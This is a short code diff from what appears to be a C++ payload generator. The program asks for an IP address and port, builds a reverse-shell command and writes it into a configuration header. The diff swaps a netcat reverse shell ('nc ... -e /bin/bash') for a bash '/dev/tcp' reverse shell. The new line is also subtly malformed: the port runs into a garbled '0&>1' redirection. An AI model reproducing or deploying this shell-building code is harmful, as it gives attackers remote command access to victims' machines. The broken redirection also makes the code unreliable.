@@ -77,7 +77,8 @@ int main(){
                 getline(cin, ip);
                 cout << "Host Port:\n";
                 getline(cin, port);
-                command = "nc " + ip + " " + port + " -e /bin/bash";
+                command = TARGET_BASH + " -i >& /dev/tcp/" + ip + "/" + port
+                          + "0&>1";
                 config_file.open("payload4_config.h");
                 config_file << "std::string command = \"" << command << "\";";
                 config_file.close();
